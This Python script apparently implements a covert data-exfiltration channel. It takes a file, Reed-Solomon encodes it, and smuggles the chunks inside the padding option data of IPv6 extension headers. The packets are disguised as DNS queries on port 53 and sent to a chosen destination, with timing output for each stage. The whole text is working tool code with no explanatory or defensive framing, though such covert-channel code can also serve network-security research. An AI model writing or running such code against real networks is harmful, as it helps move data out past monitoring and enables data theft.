#!/usr/bin/python
import sys
import time
import socket
from scapy.all import *
import getinfo
import fileop
import reedsolomon as rs
codec = rs.set_codec(255, 223)
ethertype = b"\x86\xdd" # IPv6
clientMAC, clientIP = getinfo.src_addrs()
dnsMAC, dnsIP = getinfo.dst_addrs()
# Process the binary file to send
print("Start slicing data...")
T_slice = time.time() # Timer
filename = sys.argv[1]
msglist, redun = fileop.bin_split(filename)
cw_cnt = len(msglist) # num of codewords
enclist = []
# RS Encoder
print("Start encoding...")
T_encode = time.time()
for i in range(cw_cnt):
    encmsg = rs.encoder(msglist[i], codec)
    slicing = [encmsg[i:i+16] for i in range(0, len(encmsg), 16)]
    enclist.append(slicing)
# Send
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
s.bind((str(conf.iface), 0))
print("Start sending...")
T_send = time.time()
whohas_pre = filename + '.' + str(cw_cnt) + '.'
print("--> <filename>.<codeword_cnt>.<codeword_index>.<last_bytes>.org")
for cw in range(cw_cnt):
    for i in range(16):
        whohas = whohas_pre + str(cw) + '.' + str(redun) + '.org'
        pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(optdata=enclist[cw][i]))/UDP(sport=53, dport=53)/DNS(id=i, qd=DNSQR(qname=whohas, qtype="A"))
        send(pkt, verbose=0)
        print("Packets sended: index {}".format(cw * 16 + i), end = '\r')
        #time.sleep(0.005)
T_end = time.time() # Timer
print("\nFinished sending {} packets.".format(cw_cnt * 16))
print("Time for slicing: {:.2f} seconds.".format(T_encode - T_slice))
print("Time for encoding: {:.2f} seconds.".format(T_send - T_encode))
print("Time for sending: {:.2f} seconds.".format(T_end - T_send))
print("Totally spent {:.2f} seconds.".format(T_end - T_slice))
s.close()
